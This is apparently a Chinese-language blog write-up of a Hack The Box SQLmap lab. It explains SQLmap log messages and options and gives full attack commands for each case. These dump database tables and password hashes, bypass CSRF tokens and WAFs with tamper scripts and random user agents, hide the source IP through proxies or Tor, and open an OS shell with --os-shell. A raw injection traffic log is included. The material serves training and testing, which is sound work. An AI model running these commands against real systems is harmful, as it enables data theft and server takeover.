---
title: HackTheBox-SQLmap
published: 2026-07-15
updated: 2026-07-15
draft: false
description: SQLmap的使用方法
image: ""
tags:
  - SQL注入
  - Hack-The-Box
  - SQLmap
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

# SQlmap日志描述

### URL content is stable

```
这意味着，在连续发送相同请求的情况下，响应之间不会出现重大变化。从自动化角度来看，这一点至关重要，因为在响应稳定的情况下，更容易发现由潜在的 SQL 注入攻击引起的差异。虽然稳定性很重要，但 SQLMap 拥有先进的机制，可以自动消除可能来自不稳定目标的“噪声”。
```

### Parameter appears to be dynamic

```
被测参数最好是“动态的”，这意味着对其值的任何更改都会导致响应的变化；因此，该参数可以与数据库关联。如果输出是“静态的”且保持不变，则可能表明目标系统（至少在当前上下文中）未处理被测参数的值。
```

### Parameter might be injectable\

```
数据库管理系统 (DBMS) 错误是潜在 SQL 注入的良好指标。在本例中，当 SQLMap 发送一个故意无效的值（例如 `false` ?id=1",)..).))'）时，MySQL 出现错误，这表明被测参数可能存在 SQL 注入漏洞，且目标数据库可能是 MySQL。需要注意的是，这并非 SQL 注入的证明，而仅仅表明需要在后续运行中验证检测机制。
```

### Parameter might be vulnerable to XSS attacks

```
虽然这不是 SQLMap 的主要用途，但它也会对是否存在 XSS 漏洞进行快速启发式测试。在大规模测试中，SQLMap 需要测试大量参数，因此这种快速启发式检查非常有用，尤其是在没有发现 SQL 注入漏洞的情况下。
```

### Back-end DBMS is '...'

```
通常情况下，SQLMap 会测试所有受支持的数据库管理系统 (DBMS)。如果明确表明目标正在使用特定的 DBMS，我们可以将有效载荷的范围缩小到仅针对该 DBMS。
```

### Level/risk values

```
如果明确表明目标系统使用了特定的数据库管理系统（DBMS），则可以针对该DBMS扩展测试范围，超出常规测试。
这意味着要运行所有针对该DBMS的SQL注入攻击载荷；而如果没有检测到DBMS，则只会测试最常用的攻击载荷。
```

### Reflective values found

```
请注意，响应中包含部分已使用的有效负载。这可能会导致自动化工具出现问题，因为它代表了无用信息。不过，SQLMap 具有过滤机制，可以在比较原始页面内容之前移除这些无用信息。
```

### Parameter appears to be injectable

```
此消息表明该参数似乎可被注入，但仍有可能为误报。对于基于布尔值的盲注和类似的 SQL 注入类型（例如，基于时间的盲注），由于误报率较高，SQLMap 会在运行结束时执行广泛的测试，包括简单的逻辑检查，以排除误报。

此外，with --string="luther"SQLMap 还识别并利用响应中出现的常量字符串值luther来区分不同TRUE的响应FALSE。这是一个重要的发现，因为在这种情况下，无需使用诸如动态性/反射消除或响应模糊比较等高级内部机制，这些机制不会造成误报。
```

### Time-based comparison statistical model

```
SQLMap 使用统计模型来识别正常响应和（故意）延迟的目标响应。为了使该模型正常工作，需要收集足够数量的正常响应时间数据。这样，即使在高延迟网络环境中，SQLMap 也能通过统计方法区分故意延迟。
```

### Extending UNION query injection technique tests

```
与其它类型的 SQLi 相比，UNION 查询 SQLi 检查需要更多的请求才能成功识别可用的有效载荷。为了降低每个参数的测试时间，尤其是在目标看似无法注入的情况下，此类检查的请求次数被限制为一个固定值（例如 10）。但是，如果目标存在漏洞的可能性较大，尤其是在发现另一种（潜在的）SQLi 技术的情况下，SQLMap 会增加 UNION 查询 SQLi 检查的默认请求次数，因为成功率更高。
```

### Technique appears to be usable

```
为了对 UNION 查询 SQL 注入类型进行启发式检查，在实际UNION发送有效载荷之前，ORDER BY会检查一种称为 SQLMap 的技术是否可用。如果可用，SQLMap 可以UNION通过执行二分查找方法快速识别所需列的正确数量。
```

### Parameter is vulnerable

```
这是 SQLMap 最重要的消息之一，因为它表明该参数存在 SQL 注入漏洞。通常情况下，用户可能只想找到至少一个可用于攻击目标的注入点（即参数）。但是，如果我们对 Web 应用程序进行全面测试，并希望报告所有潜在漏洞，则可以继续搜索所有易受攻击的参数。
```

### Sqlmap identified injection points

```
接下来列出了所有注入点的类型、标题和有效载荷，这最终证明了已成功检测和利用 SQL 注入漏洞。需要注意的是，SQLMap 仅列出那些经证实可利用（即可用）的漏洞。
```

### Data logged to text files

```
这指示用于存储特定目标（在本例中为 `<target_name>`）所有日志、会话和输出数据的本地文件系统位置www.example.com。在首次运行（成功检测到注入点）之后，后续运行的所有详细信息都将存储在同一目录的会话文件中。这意味着 SQLMap 会根据会话文件的数据，尽可能减少所需的目标请求次数。
```

# 高级用法

### 前/后缀调整

```
在极少数情况下，需要使用特殊的前缀和后缀值，而常规的 SQLMap 运行无法涵盖这些情况。
对于此类运行，--prefix可以--suffix使用如下选项：

sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

### risk/level

```
默认情况下，SQLMap 结合了一组预定义的最常用边界（即前缀/后缀对）以及在目标存在漏洞时成功率较高的向量。此外，用户还可以使用 SQLMap 中已集成的更大规模的边界和向量集。

针对此类需求，应采用--level以下选项：--risk

该选项--level（1-5，默认值1）会根据其成功预期（即预期越低，级别越高）扩展所使用的向量和边界。
该选项--risk（1-3，默认值1）根据向量集在目标端造成问题的风险（即数据库条目丢失或拒绝服务的风险）来扩展所使用的向量集。
检查不同 ` --leveland`值下使用的边界和有效负载之间差异的最佳方法--risk是使用-v`--verbosity` 选项设置详细级别。在详细级别 3 或更高（例如 `--verbosity 3` -v 3）下
```

### 高级调校

为了进一步微调检测机制，SQLMap 提供了一系列丰富的开关和选项。通常情况下，SQLMap 不需要使用这些开关和选项。但是，我们仍然需要熟悉它们，以便在需要时能够使用。

##### 状态码
例如，当处理包含大量动态内容的大型目标响应时，可以利用响应之间的细微差别TRUE进行FALSE检测。如果响应之间的差异TRUE可以FALSE从 HTTP 代码中看出（例如，` 200GET` 响应对应 ` GET` 代码，`GET` 响应对应 ` TRUEGET`500代码FALSE），则可以使用该选项--code将响应检测限定TRUE为特定的 HTTP 代码（例如，`GET` --code=200）。

##### 标题
如果可以通过检查 HTTP 页面标题来发现响应之间的差异，--titles则可以使用该开关来指示检测机制根据 HTML 标签的内容进行比较`title`。

##### 字符串
如果TRUE响应中出现特定的字符串值（例如success），而FALSE响应中不存在该字符串值，则可以使用该选项--string仅根据该单个值的出现来固定检测（例如`--string=success`）。

##### 纯文本
当处理大量隐藏内容时，例如某些 HTML 页面行为标签（例如`<script><code><p> <style></code>、<meta><code><p></code>、<code><p></code>` 等），我们可以使用--text-only开关，该开关会删除所有 HTML 标签，并且仅基于文本（即可见）内容进行比较。

##### 技术
在某些特殊情况下，我们需要将使用的有效载荷类型限定为特定类型。例如，如果基于时间的盲注有效载荷导致响应超时等问题，或者我们希望强制使用特定的 SQL 注入有效载荷类型，则--technique可以使用该选项指定要使用的 SQL 注入技术。

例如，如果我们想跳过基于时间的盲注和堆叠式 SQLi 有效负载，而只测试基于布尔值的盲注、基于错误的和 UNION 查询有效负载，我们可以使用以下方式指定这些技术--technique=BEU。

##### UNION SQLi 调优
在某些情况下，UNIONSQL注入攻击需要用户提供额外信息才能生效。如果我们能够手动找到存在漏洞的SQL查询的确切列数，就可以使用选项将此数字提供给SQLMap --union-cols（例如--union-cols=17）。如果SQLMap使用的默认“虚拟”填充值（NULL随机整数）与存在漏洞的SQL查询结果中的值不兼容，我们可以指定一个替代值（例如--union-char='a'）。

此外，如果需要在查询末尾使用附录（UNION例如`FROM <table>`，在 Oracle 中），我们可以使用选项进行设置--union-from（例如--union-from=users）。
未能FROM自动使用正确的附录可能是由于在使用数据库管理系统 (DBMS) 之前无法检测到其名称。

### 数据库枚举

通常情况下，成功检测到 SQL 注入漏洞后，我们可以开始枚举数据库中的基本信息，例如目标主机名（--hostname）、当前用户名（--current-user）、当前数据库名称（--current-db）或密码哈希值（--passwords）。如果 SQLMap 之前已识别出 SQL 注入漏洞，则会跳过检测步骤，直接开始数据库管理系统枚举过程。

枚举通常从检索基本信息开始：

数据库版本横幅（切换--banner）
当前用户名（切换--current-user）
当前数据库名称（开关--current-db）
检查当前用户是否具有 DBA（管理员）权限（切换--is-dba）

### 高级数据库枚举

##### 数据库模式枚举

如果我们想要检索所有表的结构，以便全面了解数据库架构，我们可以使用以下开关--schema

```
sqlmap -u "http://www.example.com/?id=1" --schema
```

##### 搜索数据

处理包含大量表和列的复杂数据库结构时，我们可以使用 `SQLMap` 选项来搜索感兴趣的数据库、表和列--search。该选项允许我们使用 `<id>` 运算符搜索标识符名称LIKE。例如，如果我们要查找所有包含关键字 `<key>` 的表名user，可以按如下方式运行 `SQLMap`

```
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

在上面的例子中，我们可以立即根据这些搜索结果发现几个有趣的数据检索目标。我们也可以尝试根据特定关键字搜索所有列名（例如pass）

```
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

##### 数据库用户密码枚举破解

除了数据库表中包含的用户凭据外，我们还可以尝试导出包含数据库特定凭据（例如连接凭据）的系统表的内容。为了简化整个过程，SQLMap 提供了一个--passwords专门用于此类任务的特殊开关

```
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
### 绕过waf

##### 反 CSRF 令牌绕过

防止使用自动化工具的第一道防线是在所有 HTTP 请求中加入反 CSRF（即跨站请求伪造）令牌，特别是那些因填写网页表单而生成的请求。

简单来说，在这种情况下，每个 HTTP 请求都应该有一个（有效的）令牌值，但只有当用户实际访问并使用了该页面时，该令牌值才可用。最初的想法是为了防止恶意链接的出现，因为即使用户不知情，打开这些链接也会对已登录用户造成不良后果（例如，打开管理员页面并使用预定义的凭据添加新用户）。然而，这项安全特性也无意中增强了应用程序抵御（不必要的）自动化攻击的能力。

尽管如此，SQLMap 提供了一些选项来帮助绕过反 CSRF 保护。其中最重要的选项是 `token_name` --csrf-token。通过指定令牌参数名称（该名称应该已包含在提供的请求数据中），SQLMap 将自动尝试解析目标响应内容并查找新的令牌值，以便在下一个请求中使用它们。

此外，即使用户没有通过显式指定令牌名称--csrf-token，如果提供的参数之一包含任何常见前缀（例如csrf，xsrf）token，系统也会提示用户是否在后续请求中更新该令牌：

```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

##### 唯一值旁路

在某些情况下，Web 应用程序可能仅要求在预定义参数中提供唯一值。这种机制类似于上述的反 CSRF 技术，区别在于无需解析网页内容。因此，只需确保每个请求的预定义参数具有唯一值，Web 应用程序即可轻松防止 CSRF 攻击，同时还能绕过一些自动化工具。为此，--randomize应使用以下选项，指向包含需要在发送前随机化的值的参数名称：

```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

##### 计算参数旁路

另一种类似的机制是，Web 应用程序期望根据其他参数值计算出正确的参数值。通常，一个参数值必须包含另一个参数值h=MD5(id)的消息摘要

```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```
##### IP地址隐藏

如果我们想要隐藏自己的 IP 地址，或者某个 Web 应用程序的保护机制会将我们当前的 IP 地址列入黑名单，我们可以尝试使用代理或匿名网络 Tor。可以通过 `--proxy-host` 选项--proxy（例如 `--proxy-host` --proxy="socks4://177.39.187.70:33283"）来设置代理，我们需要在其中添加一个可用的代理。

此外，如果我们有一个代理列表，可以通过选项将其提供给 SQLMap --proxy-file。这样，SQLMap 将按顺序遍历列表，如果遇到任何问题（例如，IP 地址被列入黑名单），它将直接从当前代理跳到列表中的下一个代理。另一种选择是使用 Tor 网络来实现易于使用的匿名化，我们的 IP 地址可以出现在大量 Tor 出口节点中的任何一个。如果 Tor 网络已正确安装在本地计算机上，则应该SOCKS4在本地端口 9050 或 9150 上运行代理服务。通过使用该选项--tor，SQLMap 将自动尝试查找本地端口并正确使用它。

如果我们想确保 Tor 被正确使用，以防止出现意外行为，可以使用该开关--check-tor。在这种情况下，SQLMap 将连接到 Torhttps://check.torproject.org/并检查响应是否包含预期结果（即，Congratulations是否出现在响应中）。

##### waf旁路

每次运行 SQLMap 时，作为初始测试的一部分，SQLMap 会使用一个不存在的参数名（例如 `<parameter name>` ?pfov=...）发送一个预定义的恶意有效载荷，以测试是否存在 WAF（Web 应用程序防火墙）。如果用户和目标之间存在任何保护措施，则响应将与原始响应有显著差异。例如，如果部署了最流行的 WAF 解决方案之一（ModSecurity），则在发出406 - Not Acceptable此类请求后应该会收到响应。

如果检测到威胁，为了识别实际的保护机制，SQLMap 使用第三方库identYwaf，其中包含 80 种不同 WAF 解决方案的签名。如果我们想完全跳过此启发式测试（即，为了减少噪声），我们可以使用 switch 语句--skip-waf。

##### 用户代理黑名单绕过

如果在运行 SQLMap 时出现紧急问题（例如，从一开始就出现 HTTP 错误代码 5XX），我们首先应该考虑的是 SQLMap 使用的默认用户代理是否可能被列入黑名单（例如User-agent: sqlmap/1.4.9 (http://sqlmap.org)）。

可以通过开关轻松绕过此限制--random-agent，该开关会将默认用户代理更改为从浏览器使用的大量值中随机选择的值。

> 注意：如果在运行过​​程中检测到某种形式的保护措施，即使目标系统存在其他安全机制，也可能出现问题。主要原因是此类保护措施不断发展和改进，使得攻击者的回旋余地越来越小。

##### 篡改脚本

最后，SQLMap 中用于绕过 WAF/IPS 解决方案的最常用机制之一是所谓的“篡改”脚本。篡改脚本是一种特殊的（Python）脚本，用于在请求发送到目标之前对其进行修改，大多数情况下是为了绕过某些保护措施。

例如，最流行的篡改脚本之一是将所有大于号 ( >>) 替换为逗号 (")，将所有等于号 ( ") 替换为NOT BETWEEN 0 AND #逗号 ( ") 。这样一来，许多原始的保护机制（主要用于防止 XSS 攻击）就很容易被绕过，至少对于 SQL 注入而言是如此。=BETWEEN # AND #

篡改脚本可以像链式调用一样，在--tamper选项中依次执行（例如--tamper=between,randomcase），并根据预定义的优先级运行。预定义优先级是为了防止任何意外行为，因为有些脚本会通过修改 SQL 语法来篡改有效载荷（例如ifnull2ifisnull）。相反，有些篡改脚本则不关心内部内容（例如appendnullbyte）。

篡改脚本可以修改请求的任何部分，但大多数会更改有效负载的内容。最值得注意的篡改脚本如下：

```
篡改脚本	描述
0eunion	替换所有实例与联盟电子联盟
base64encode	对给定有效载荷中的所有字符进行 Base64 编码。
between	将大于号 ( >) 替换为大于号NOT BETWEEN 0 AND #，将等于号 ( =) 替换为等于号。BETWEEN # AND #
commalesslimit	LIMIT M, N用LIMIT N OFFSET M对应的实例替换（MySQL）实例
equaltolike	将所有出现的等号运算符 ( =) 替换为LIKE对应的运算符。
halfversionedmorekeywords	在每个关键字前添加（MySQL）版本化注释
modsecurityversioned	包含完整的查询以及（MySQL）版本化注释
modsecurityzeroversioned	包含完整的查询以及（MySQL）零版本注释
percentage	%在每个字符前添加百分号（ ）（例如 SELECT -> %S%E%L%E%C%T）
plus2concat	将加号运算符 ( +) 替换为 (MsSQL) 函数 CONCAT() 的对应项
randomcase	将每个关键字字符替换为随机大小写值（例如 SELECT -> SEleCt）
space2comment	将空格字符 ( ) 替换为注释 `/
space2dash	将空格字符 ( ) 替换为破折号注释 ( --)，后跟随机字符串和换行符 ( \n)。
space2hash	将（MySQL）中空格字符（ ）替换为井号字符（#）后跟随机字符串和换行符（\n）。
space2mssqlblank	将 (MsSQL) 中出现的空格字符 ( ) 替换为一组有效字符中的随机空格字符。
space2plus	将空格字符 ( ) 替换为加号 ( +)
space2randomblank	将空格字符 ( ) 替换为一组有效字符中的随机空白字符
symboliclogical	将 AND 和 OR 逻辑运算符替换为它们的符号对应物（&&和||）。
versionedkeywords	将每个非函数关键字用（MySQL）版本注释括起来。
versionedmorekeywords	将每个关键字用（MySQL）版本注释括起来
要获取所有已实现的篡改脚本列表以及上述描述，--list-tampers可以使用该开关。我们还可以针对任何自定义类型的攻击（例如二阶 SQL 注入）开发自定义篡改脚本。
```

##### 杂项旁路

```
除了其他保护绕过机制外，还有两种值得一提。第一种是Chunked传输编码，可以通过开关启用--chunked，它会将 POST 请求体分割成所谓的“块”。被列入黑名单的 SQL 关键字会被分割到不同的块中，这样包含这些关键字的请求就可以不被发现地通过验证。

另一种绕过机制是HTTP parameter pollution （HPP），其中有效载荷以类似于的情况拆分为--chunked不同的相同参数名称值（例如?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...），如果目标平台支持，则由目标平台连接起来（例如ASP）。
```
# flag1

```
sqlmap -u http://154.57.164.65:30459/case1.php?id=1 -T flag1 --dump
```

# 表 flag2 的内容是什么？

在浏览器里复制为curl，将curl改为sqlmap即可，或者也可以将部分修改为id=*,请注意，我在靶场环境中实验只需要攻破即可，切勿在现实真实环境中使用`--dump`参数，拖库(盗窃数据)3-7年，如有不对请及时查看网络安全法,还有一件事就是batch参数会帮你做出选择，但是我没有关注过是否会提升risk和level，因为手动爆库和表居多，没怎么用过，需要注意考察下

```
sqlmap 'http://154.57.164.70:31117/case2.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://154.57.164.70:31117/case2.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://154.57.164.70:31117' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'id=1' \
  --dump \
  --batch
```
# flag3 表的内容是什么？

这里我们可以看到响应里有一个set-cookie分配cookie：id=1，所以我们需要手动添加cookie头，可以使用*提示sqlmap注入点在这里

```
curl 'http://154.57.164.70:31117/case3.php' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://154.57.164.70:31117/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  -H 'cookie: id=*' \
  --dump \
  --batch
```

我使用了上述命令后没有爆出flag3，只有user表，所以需要

```
sqlmap 'http://154.57.164.70:31117/case3.php'   --compressed   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Connection: keep-alive'   -H 'Referer: http://154.57.164.70:31117/'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Priority: u=0, i' -H 'cookie: id=*' --dbs
```

爆库名

```
sqlmap 'http://154.57.164.70:31117/case3.php'   --compressed   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Connection: keep-alive'   -H 'Referer: http://154.57.164.70:31117/'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Priority: u=0, i' -H 'cookie: id=*' -D testdb -T 'flag3' --dump
```

知道表名的情况下就不爆破表了，直接获得数据

# 表 flag4 的内容是什么？

这次的注入点在json内，比较麻烦，htb也给出了提示，我们直接写个文件标记注入点即可,打开bp复制下包

```
GET /case4.php HTTP/1.1
Host: 154.57.164.70:31117
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.70:31117/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

这里看到请求方式是get，但是我们需要json传送注入点，所以改为post,然后标记下,还需要添加Content-Type: application/json因为上传格式是json

```
POST /case4.php HTTP/1.1
Host: 154.57.164.70:31117
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.70:31117/
Content-Type: application/json
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{"id": 1*}
```

然后

```
sqlmap -r tmp.txt --batch

sqlmap -r tmp.txt -T flag4 --dump
```

# 表 flag5 的内容是什么？

进入页面发现没有输入框，点击按钮后会自动显示我们当前的数据库内的信息，那就抓包

```
GET /case5.php?id=1 HTTP/1.1
Host: 154.57.164.64:30626
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://154.57.164.64:30626/case5.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

那就需要对get请求中的id进行sql注入,把报文写入到临时文件进行sqlmap注入即可,但是sqlmap没跑出来，我自己手动测试

```
GET /case5.php?id=1+or+1=1--+ HTTP/1.1
```

输出结果成功实现sql注入，疑惑，我想了一下，get请求里不允许出现空格需要使用+代替，所以我需要使用sqlmap脚本

```
sqlmap -r tmp.txt --tamper=space2plus --flush-session
```

不行，除了这个其他包括前后缀和其他技巧我基本都试了，没用，看提示直接找flag5，只能当题做

```
sqlmap -u "http://154.57.164.64:30626/case5.php?id=1" --level 5 --risk 3 --no-cast -T flag5 --dump
```

这才跑出来

说实话了真狗屎啊

```
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_buF_w0r7h_17} |
+----+---------------------------------+
```

这是我跑出来的东西，但是实际上buF是bu7，使用了--no-cast参数并且多次尝试

# 表 flag6 的内容是什么？（案例 #6）

闭合符号

```
http://154.57.164.64:30626/case6.php?col=id`)--+
```

测试

```
sqlmap -u "http://154.57.164.64:30626/case6.php?col=id" --prefix="\`)" --dump --batch
```

# flag7


```
sqlmap.py -u "http://154.57.164.64:30626/case7.php?id=1" --batch --dump --union-cols=5 --level=5 --risk=3 --dbms=mysql --level 5 --risk 3 --no-cast
```

# 列名中包含“style”一词的列叫什么名字？（案例​​1）

```
sqlmap -u http://154.57.164.65:30459/case1.php?id=1 --search -C style
```

# Kimberly 用户的密码是什么？（案例 1）

```
直接dump后续会帮你输出密码
```

# 表 flag8 的内容是什么？（案例 #8）

在这里我是使用了brup suite 的 CO2 插件链接Windows环境下的sqlmap工具，kali不方便，因为使用的是wsl版本

```
sqlmap -u "http://154.57.164.65:30459/case8.php" --data="id=1^&t0ken=5ccoAzfuQA2Kkxu7UghOrVwDJ5g0gpOyKqkyA4poI" --dbms="MySQL " --csrf-token="t0ken" -T flag8 --dump --no-cast --cookie="PHPSESSID=etmrhlmk6nivupre7qupk7bgdv"
```

# flag9 表的内容是什么？（案例 #9）

由于指定了uid所以uid是唯一值不可更改

```
sqlmap -u "http://154.57.164.65:30459/case9.php?id=1^&uid=1179534918" --dbms="MySQL " --randomize=uid  -T flag9 --dump --no-cast --cookie="PHPSESSID=etmrhlmk6nivupre7qupk7bgdv"
```

# 表 flag10 的内容是什么？（案例 #10）

```
sqlmap -u "http://154.57.164.83:30645/case10.php" --data="id=1" --dump --random-agent --tamper=between,randomcase --batch --no-cast
```

# 表 flag11 的内容是什么？（案例 #11）

使用上面那个命令就行

# 尝试使用 SQLMap 读取文件“/var/www/html/flag.txt”。

```
sqlmap -u "http://154.57.164.80:30271/?id=1" --is-dba
```

使用--os-shell命令

```
sqlmap -u "http://154.57.164.80:30271/?id=1" --os-shell
```

# 使用 SQLMap 获取远程主机上的交互式操作系统 shell，并尝试在主机中查找另一个 flag。

```
os-shell> find / -name flag.*
```

# 技能评估

正常测试action.php的接口，返回显示hacker!!!,肯定是被拦截了，因为使用工具时候`-v 6`的详细输出让我推断可能是UA头的问题，设置了random agent后果然只报错没有被拦截了

```
[16:23:00] [PAYLOAD] {id:1") AND MAKE_SET(7961=5489,5489) AND ("lnbD"="lnbD
[16:23:00] [TRAFFIC OUT] HTTP request [#283]:
POST /action.php HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: application/json
Host: 154.57.164.73:31166
Accept: */*
Accept-Encoding: gzip,deflate
Connection: keep-alive
Content-length: 55

{id:1") AND MAKE_SET(7961=5489,5489) AND ("lnbD"="lnbD}

[16:23:00] [TRAFFIC IN] HTTP response [#283] (200 OK):
Connection: close
Content-Length: 205
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Sat, 27 Jun 2026 08:23:00 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
URI: http://154.57.164.73:31166/action.php

<b>SQL error:</b> SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ' 285, 1, 987, 0)' at line 1<br>
```

最后是这个

```
sqlmap 'http://154.57.164.81:30165/action.php'   -X POST   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0'   -H 'Accept: */*'   -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Content-Type: application/json'   -H 'Origin: http://154.57.164.73:31166'   -H 'Connection: keep-alive'   -H 'Referer: http://154.57.164.73:31166/shop.html'   -H 'Priority: u=0'   --data '{"id":1*}' --batch --tamper=between --threads 10 --level 5 --risk 3
```
